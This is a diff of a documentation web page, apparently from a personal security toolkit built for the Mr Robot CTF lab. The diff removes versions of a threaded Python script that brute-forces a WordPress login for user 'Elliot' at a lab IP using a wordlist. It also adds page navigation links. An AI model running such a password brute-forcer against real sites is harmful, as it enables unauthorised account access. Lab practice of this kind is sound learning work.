-<span class="nb">print</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">Wordlist:&quot;</span><span class="p">,</span> <span class="n">wordlist</span><span class="p">)</span>
-<span class="nb">print</span><span class="p">(</span><span class="s2">&quot;TargetURL:&quot;</span><span class="p">,</span> <span class="n">target</span><span class="p">)</span>
-
-<span class="n">threads</span> <span class="o">=</span> <span class="nb">list</span><span class="p">()</span>
-<span class="n">interesting_responses</span> <span class="o">=</span> <span class="nb">list</span><span class="p">()</span>
-<span class="n">responses_lock</span> <span class="o">=</span> <span class="n">threading</span><span class="o">.</span><span class="n">Lock</span><span class="p">()</span> <span class="c1"># the lock for updating the &quot;interesting Responses&quot; list</span>
-<span class="n">print_lock</span> <span class="o">=</span> <span class="n">threading</span><span class="o">.</span><span class="n">Lock</span><span class="p">()</span> <span class="c1"># the lock for printing to the terminal</span>
-
-<span class="n">loopcount</span> <span class="o">=</span> <span class="mi">0</span>
-<span class="k">for</span> <span class="n">word</span> <span class="ow">in</span> <span class="n">wordlist</span><span class="p">:</span>
-    <span class="n">word</span> <span class="o">=</span> <span class="n">word</span><span class="p">[:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="c1"># drop the /n at the end</span>
-    <span class="n">loopcount</span> <span class="o">+=</span> <span class="mi">1</span>
-    <span class="n">thr</span> <span class="o">=</span> <span class="n">threading</span><span class="o">.</span><span class="n">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">request_thread</span><span class="p">,</span> <span class="n">args</span><span class="o">=</span><span class="p">(</span><span class="n">loopcount</span><span class="p">,</span><span class="n">word</span><span class="p">),</span> <span class="n">daemon</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
-    <span class="n">thr</span><span class="o">.</span><span class="n">start</span><span class="p">()</span>
-    <span class="n">threads</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">thr</span><span class="p">)</span>
-    <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span> <span class="c1">## Thread max isnt limited, so limted to 10/sec</span>
-
-<span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Interesting Resonses:&quot;</span><span class="p">)</span>
-<span class="nb">print</span><span class="p">(</span><span class="n">interesting_responses</span><span class="p">)</span>
-
-<span class="nb">print</span><span class="p">(</span><span class="s2">&quot;END&quot;</span><span class="p">)</span>
-</pre></div>
-</div>
-</div>
-</div>
 <hr>
 </section>
 <section id="v3-0">
@@ -660,106 +582,6 @@ It was then extended for the Mr Robot room when Hydra was taking forever to reac
 <li><p>Impliment the template</p></li>
 <li><p>Add the parser for arguements so they dont need to be statically located.</p></li>
 </ul>
-<div class="cell tag_skip-execution docutils container">
-<div class="cell_input docutils container">
-<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="c1"># A Bruteforce software for html headers (because burp is too slow)</span>
-<span class="c1"># Part of The-Cyber-Toolkit</span>
-<span class="c1"># V3.0</span>
-<span class="c1"># HTTP Post with response search</span>
-
-<span class="c1"># Implimented Features</span>
-<span class="c1"># Provide URL and wordlist</span>
-
-<span class="c1"># Simple reporting on what is found </span>
-
-<span class="c1"># Planned features</span>
-<span class="c1"># Use template file to bruteforce</span>
-<span class="c1"># Threading the simple request</span>
-
-<span class="c1">## Call with WebHeaderBruteForce [target] [wordlist] [templatefile]</span>
-
-<span class="kn">import</span> <span class="nn">requests</span>
-<span class="kn">import</span> <span class="nn">threading</span>
-<span class="kn">import</span> <span class="nn">time</span>
-<span class="kn">import</span> <span class="nn">sys</span>
-
-<span class="n">target</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
-<span class="n">words</span><span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span>
-<span class="c1">#template = sys.argv[2]</span>
-<span class="n">template</span> <span class="o">=</span> <span class="s2">&quot;none&quot;</span>
-
-<span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Target:&quot;</span><span class="p">,</span><span class="n">target</span><span class="p">)</span>
-<span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Wordlist:&quot;</span><span class="p">,</span><span class="n">words</span><span class="p">)</span>
-<span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Template:&quot;</span><span class="p">,</span><span class="n">template</span><span class="p">)</span>
-
-<span class="n">foundone</span> <span class="o">=</span> <span class="kc">False</span>
-
-<span class="k">def</span> <span class="nf">request_thread</span><span class="p">(</span><span class="n">name</span><span class="p">,</span> <span class="n">word</span><span class="p">):</span>
-    <span class="n">responses_to_ignore</span> <span class="o">=</span> <span class="p">[</span><span class="mi">200</span><span class="p">]</span>
-    <span class="n">head_params</span> <span class="o">=</span> <span class="p">{</span>
-        <span class="s2">&quot;Host&quot;</span><span class="p">:</span> <span class="s2">&quot;10.10.158.212&quot;</span><span class="p">,</span>
-        <span class="s2">&quot;User-Agent&quot;</span> <span class="p">:</span> <span class="s2">&quot;Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0&quot;</span><span class="p">,</span>
-        <span class="s2">&quot;Accept&quot;</span> <span class="p">:</span> <span class="s2">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&quot;</span><span class="p">,</span>
-        <span class="s2">&quot;Accept-Language&quot;</span> <span class="p">:</span> <span class="s2">&quot;en-US,en;q=0.5&quot;</span><span class="p">,</span>
-        <span class="s2">&quot;Accept-Encoding&quot;</span> <span class="p">:</span> <span class="s2">&quot;gzip, deflate&quot;</span><span class="p">,</span>
-        <span class="s2">&quot;Content-Type&quot;</span> <span class="p">:</span> <span class="s2">&quot;application/x-www-form-urlencoded&quot;</span><span class="p">,</span>
-        <span class="s2">&quot;Origin&quot;</span> <span class="p">:</span> <span class="s2">&quot;http://10.10.158.212&quot;</span><span class="p">,</span>
-        <span class="s2">&quot;Connection&quot;</span> <span class="p">:</span> <span class="s2">&quot;close&quot;</span><span class="p">,</span>
-        <span class="s2">&quot;Referer&quot;</span> <span class="p">:</span> <span class="s2">&quot;http://10.10.158.212/wp-login.php&quot;</span><span class="p">,</span>
-        <span class="s2">&quot;Cookie&quot;</span> <span class="p">:</span> <span class="s2">&quot;wordpress_test_cookie=WP+Cookie+check&quot;</span><span class="p">,</span>
-        <span class="s2">&quot;Upgrade-Insecure-Requests&quot;</span> <span class="p">:</span> <span class="s2">&quot;1&quot;</span>
-    <span class="p">}</span>
-
-    <span class="n">content</span> <span class="o">=</span> <span class="p">{</span>
-        <span class="s2">&quot;log&quot;</span> <span class="p">:</span> <span class="s2">&quot;Elliot&quot;</span><span class="p">,</span> 
-        <span class="s2">&quot;pwd&quot;</span> <span class="p">:</span> <span class="n">word</span><span class="p">,</span>
-        <span class="s2">&quot;wp-submit&quot;</span> <span class="p">:</span> <span class="s2">&quot;Log In&quot;</span>
-    <span class="p">}</span>
-    <span class="c1">#&quot;log=theuser&amp;pwd=thepassword&amp;wp-submit=Log+In&amp;redirect_to=http%3A%2F%2F10.10.158.212%2Fwp-admin%2F&amp;testcookie=1&quot;</span>
-
-    <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">content</span><span class="p">)</span>
-    <span class="k">if</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="s2">&quot;you entered for the username&quot;</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">:</span>
-        <span class="k">global</span> <span class="n">foundone</span>
-        <span class="n">foundone</span> <span class="o">=</span> <span class="kc">True</span>
-        <span class="n">responses_lock</span><span class="o">.</span><span class="n">acquire</span><span class="p">()</span>
-        <span class="n">interesting_responses</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">word</span><span class="p">)</span>
-        <span class="n">responses_lock</span><span class="o">.</span><span class="n">release</span><span class="p">()</span>
-        <span class="n">print_lock</span><span class="o">.</span><span class="n">acquire</span><span class="p">()</span>
-        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;--------------&quot;</span><span class="p">)</span>
-        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;found in:&quot;</span><span class="p">,</span> <span class="n">name</span><span class="p">)</span>
-        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Word from Wordlist:&quot;</span><span class="p">,</span> <span class="n">word</span><span class="p">)</span>
-        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;--------------&quot;</span><span class="p">)</span>
-        <span class="n">print_lock</span><span class="o">.</span><span class="n">release</span><span class="p">()</span>
-    <span class="k">else</span><span class="p">:</span>
-        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Nothing for&quot;</span><span class="p">,</span> <span class="n">word</span><span class="p">,</span> <span class="s2">&quot;in thread&quot;</span><span class="p">,</span> <span class="n">name</span><span class="p">)</span>
-
-
-<span class="n">threads</span> <span class="o">=</span> <span class="nb">list</span><span class="p">()</span>
-<span class="n">interesting_responses</span> <span class="o">=</span> <span class="nb">list</span><span class="p">()</span>
-<span class="n">responses_lock</span> <span class="o">=</span> <span class="n">threading</span><span class="o">.</span><span class="n">Lock</span><span class="p">()</span> <span class="c1"># the lock for updating the &quot;interesting Responses&quot; list</span>
-<span class="n">print_lock</span> <span class="o">=</span> <span class="n">threading</span><span class="o">.</span><span class="n">Lock</span><span class="p">()</span> <span class="c1"># the lock for printing to the terminal</span>
-
-<span class="n">wordlist</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="n">words</span><span class="p">)</span>
-
-<span class="n">loopcount</span> <span class="o">=</span> <span class="mi">0</span>
-<span class="k">for</span> <span class="n">word</span> <span class="ow">in</span> <span class="n">wordlist</span><span class="p">:</span>
-    <span class="n">word</span> <span class="o">=</span> <span class="n">word</span><span class="p">[:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="c1"># drop the /n at the end</span>
-    <span class="n">loopcount</span> <span class="o">+=</span> <span class="mi">1</span>
-    <span class="n">thr</span> <span class="o">=</span> <span class="n">threading</span><span class="o">.</span><span class="n">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">request_thread</span><span class="p">,</span> <span class="n">args</span><span class="o">=</span><span class="p">(</span><span class="n">loopcount</span><span class="p">,</span><span class="n">word</span><span class="p">),</span> <span class="n">daemon</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
-    <span class="n">thr</span><span class="o">.</span><span class="n">start</span><span class="p">()</span>
-    <span class="n">threads</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">thr</span><span class="p">)</span>
-    <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span> <span class="c1">## Thread max isnt limited, so limted to 10/sec</span>
-    <span class="k">if</span> <span class="n">foundone</span><span class="p">:</span>
-        <span class="k">break</span>
-
-<span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Interesting Resonses:&quot;</span><span class="p">)</span>
-<span class="nb">print</span><span class="p">(</span><span class="n">interesting_responses</span><span class="p">)</span>
-
-<span class="nb">print</span><span class="p">(</span><span class="s2">&quot;END&quot;</span><span class="p">)</span>
-</pre></div>
-</div>
-</div>
-</div>
 <hr>
 <section id="v3-1-wip">
 <h3>V3.1 WIP<a class="headerlink" href="#v3-1-wip" title="Permalink to this heading">#</a></h3>
@@ -767,113 +589,6 @@ It was then extended for the Mr Robot room when Hydra was taking forever to reac
 <li><p>Added max thread value</p></li>
 <li><p>Added hardcoded checkpoint</p></li>
 </ul>
-<div class="cell tag_skip-execution docutils container">
-<div class="cell_input docutils container">
-<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="c1"># A Bruteforce software for html headers (because burp is too slow)</span>
-<span class="c1"># Part of The-Cyber-Toolkit</span>
-<span class="c1"># V3.0</span>
-<span class="c1"># HTTP Post with response search</span>
-
-<span class="c1"># Implimented Features</span>
-<span class="c1"># Provide URL and wordlist</span>
-
-<span class="c1"># Simple reporting on what is found </span>
-
-<span class="c1"># Planned features</span>
-<span class="c1"># Use template file to bruteforce</span>
-<span class="c1"># Threading the simple request</span>
-
-<span class="c1">## Call with WebHeaderBruteForce [target] [wordlist] [templatefile]</span>
-
-<span class="kn">import</span> <span class="nn">requests</span>
-<span class="kn">import</span> <span class="nn">threading</span>
-<span class="kn">import</span> <span class="nn">time</span>
-<span class="kn">import</span> <span class="nn">sys</span>
-<span class="kn">from</span> <span class="nn">concurrent.futures</span> <span class="kn">import</span> <span class="n">ThreadPoolExecutor</span>
-
-<span class="n">target</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
-<span class="n">words</span><span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span>
-<span class="c1">#template = sys.argv[2]</span>
-<span class="n">template</span> <span class="o">=</span> <span class="s2">&quot;none&quot;</span>
-
-<span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Target:&quot;</span><span class="p">,</span><span class="n">target</span><span class="p">)</span>
-<span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Wordlist:&quot;</span><span class="p">,</span><span class="n">words</span><span class="p">)</span>
-<span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Template:&quot;</span><span class="p">,</span><span class="n">template</span><span class="p">)</span>
-
-<span class="n">foundone</span> <span class="o">=</span> <span class="kc">False</span>
-
-<span class="k">def</span> <span class="nf">request_thread</span><span class="p">(</span><span class="n">name</span><span class="p">,</span> <span class="n">word</span><span class="p">):</span>
-    <span class="n">responses_to_ignore</span> <span class="o">=</span> <span class="p">[</span><span class="mi">200</span><span class="p">]</span>
-    <span class="n">head_params</span> <span class="o">=</span> <span class="p">{</span>
-        <span class="s2">&quot;Host&quot;</span><span class="p">:</span> <span class="s2">&quot;10.10.158.212&quot;</span><span class="p">,</span>
-        <span class="s2">&quot;User-Agent&quot;</span> <span class="p">:</span> <span class="s2">&quot;Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0&quot;</span><span class="p">,</span>
-        <span class="s2">&quot;Accept&quot;</span> <span class="p">:</span> <span class="s2">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&quot;</span><span class="p">,</span>
-        <span class="s2">&quot;Accept-Language&quot;</span> <span class="p">:</span> <span class="s2">&quot;en-US,en;q=0.5&quot;</span><span class="p">,</span>
-        <span class="s2">&quot;Accept-Encoding&quot;</span> <span class="p">:</span> <span class="s2">&quot;gzip, deflate&quot;</span><span class="p">,</span>
-        <span class="s2">&quot;Content-Type&quot;</span> <span class="p">:</span> <span class="s2">&quot;application/x-www-form-urlencoded&quot;</span><span class="p">,</span>
-        <span class="s2">&quot;Origin&quot;</span> <span class="p">:</span> <span class="s2">&quot;http://10.10.158.212&quot;</span><span class="p">,</span>
-        <span class="s2">&quot;Connection&quot;</span> <span class="p">:</span> <span class="s2">&quot;close&quot;</span><span class="p">,</span>
-        <span class="s2">&quot;Referer&quot;</span> <span class="p">:</span> <span class="s2">&quot;http://10.10.158.212/wp-login.php&quot;</span><span class="p">,</span>
-        <span class="s2">&quot;Cookie&quot;</span> <span class="p">:</span> <span class="s2">&quot;wordpress_test_cookie=WP+Cookie+check&quot;</span><span class="p">,</span>
-        <span class="s2">&quot;Upgrade-Insecure-Requests&quot;</span> <span class="p">:</span> <span class="s2">&quot;1&quot;</span>
-    <span class="p">}</span>
-
-    <span class="n">content</span> <span class="o">=</span> <span class="p">{</span>
-        <span class="s2">&quot;log&quot;</span> <span class="p">:</span> <span class="s2">&quot;Elliot&quot;</span><span class="p">,</span> 
-        <span class="s2">&quot;pwd&quot;</span> <span class="p">:</span> <span class="n">word</span><span class="p">,</span>
-        <span class="s2">&quot;wp-submit&quot;</span> <span class="p">:</span> <span class="s2">&quot;Log In&quot;</span>
-    <span class="p">}</span>
-    <span class="c1">#&quot;log=theuser&amp;pwd=thepassword&amp;wp-submit=Log+In&amp;redirect_to=http%3A%2F%2F10.10.158.212%2Fwp-admin%2F&amp;testcookie=1&quot;</span>
-
-    <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">content</span><span class="p">)</span>
-    <span class="k">if</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="s2">&quot;you entered for the username&quot;</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">:</span>
-        <span class="n">foundone</span> <span class="o">=</span> <span class="kc">True</span>
-        <span class="n">responses_lock</span><span class="o">.</span><span class="n">acquire</span><span class="p">()</span>
-        <span class="n">interesting_responses</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">word</span><span class="p">)</span>
-        <span class="n">responses_lock</span><span class="o">.</span><span class="n">release</span><span class="p">()</span>
-        <span class="n">print_lock</span><span class="o">.</span><span class="n">acquire</span><span class="p">()</span>
-        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;--------------&quot;</span><span class="p">)</span>
-        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;found in:&quot;</span><span class="p">,</span> <span class="n">name</span><span class="p">)</span>
-        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Word from Wordlist:&quot;</span><span class="p">,</span> <span class="n">word</span><span class="p">)</span>
-        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;--------------&quot;</span><span class="p">)</span>
-        <span class="n">print_lock</span><span class="o">.</span><span class="n">release</span><span class="p">()</span>
-    <span class="k">else</span><span class="p">:</span>
-        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Nothing for&quot;</span><span class="p">,</span> <span class="n">word</span><span class="p">,</span> <span class="s2">&quot;in thread&quot;</span><span class="p">,</span> <span class="n">name</span><span class="p">)</span>
-
-
-<span class="n">interesting_responses</span> <span class="o">=</span> <span class="nb">list</span><span class="p">()</span>
-<span class="n">responses_lock</span> <span class="o">=</span> <span class="n">threading</span><span class="o">.</span><span class="n">Lock</span><span class="p">()</span> <span class="c1"># the lock for updating the &quot;interesting Responses&quot; list</span>
-<span class="n">print_lock</span> <span class="o">=</span> <span class="n">threading</span><span class="o">.</span><span class="n">Lock</span><span class="p">()</span> <span class="c1"># the lock for printing to the terminal</span>
-
-<span class="n">wordlist</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="n">words</span><span class="p">)</span>
-
-<span class="n">loopcount</span> <span class="o">=</span> <span class="mi">0</span>
-<span class="n">checkpoint</span> <span class="o">=</span> <span class="mi">30000</span>
-<span class="nb">print</span><span class="p">(</span><span class="s2">&quot;There are&quot;</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="nb">list</span><span class="p">(</span><span class="n">wordlist</span><span class="p">)),</span> <span class="s2">&quot;entries to processs&quot;</span><span class="p">)</span>
-
-<span class="k">with</span> <span class="n">ThreadPoolExecutor</span><span class="p">(</span><span class="mi">100</span><span class="p">)</span> <span class="k">as</span> <span class="n">executor</span><span class="p">:</span>
-    
-    <span class="k">for</span> <span class="n">word</span> <span class="ow">in</span> <span class="n">wordlist</span><span class="p">:</span>
-        <span class="n">word</span> <span class="o">=</span> <span class="n">word</span><span class="p">[:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="c1"># drop the /n at the end</span>
-        <span class="n">loopcount</span> <span class="o">+=</span> <span class="mi">1</span>
-        <span class="k">if</span> <span class="n">loopcount</span> <span class="o">&lt;</span> <span class="n">checkpoint</span><span class="p">:</span>
-            <span class="k">continue</span>
-        <span class="k">if</span> <span class="n">loopcount</span> <span class="o">==</span> <span class="n">checkpoint</span><span class="p">:</span>
-            <span class="n">print_lock</span><span class="o">.</span><span class="n">acquire</span><span class="p">()</span>
-            <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Starting from&quot;</span><span class="p">,</span> <span class="n">checkpoint</span><span class="p">)</span>
-            <span class="n">print_lock</span><span class="o">.</span><span class="n">release</span><span class="p">()</span>
-        <span class="n">executor</span><span class="o">.</span><span class="n">submit</span><span class="p">(</span><span class="n">request_thread</span><span class="p">,</span> <span class="n">loopcount</span><span class="p">,</span> <span class="n">word</span><span class="p">)</span>
-        <span class="k">if</span> <span class="n">foundone</span><span class="p">:</span>
-            <span class="k">break</span>
-
-<span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Interesting Resonses:&quot;</span><span class="p">)</span>
-<span class="nb">print</span><span class="p">(</span><span class="n">interesting_responses</span><span class="p">)</span>
-
-<span class="nb">print</span><span class="p">(</span><span class="s2">&quot;END&quot;</span><span class="p">)</span>
-</pre></div>
-</div>
-</div>
-</div>
 </section>
 </section>
 </section>
@@ -909,6 +624,24 @@ It was then extended for the Mr Robot room when Hydra was taking forever to reac
   
     <div class="footer-article-item"><!-- Previous / next buttons -->
 <div class="prev-next-area">
+    <a class="left-prev"
+       href="FileDownloader.html"
+       title="previous page">
+      <i class="fa-solid fa-angle-left"></i>
+      <div class="prev-next-info">
+        <p class="prev-next-subtitle">previous</p>
+        <p class="prev-next-title">File Downloader</p>
+      </div>
+    </a>
+    <a class="right-next"
+       href="../Other/FormattingNotes.html"
+       title="next page">
+      <div class="prev-next-info">
+        <p class="prev-next-subtitle">next</p>
+        <p class="prev-next-title">Formatting Notes</p>
+      </div>
+      <i class="fa-solid fa-angle-right"></i>
+    </a>
 </div></div>
   
 </div>
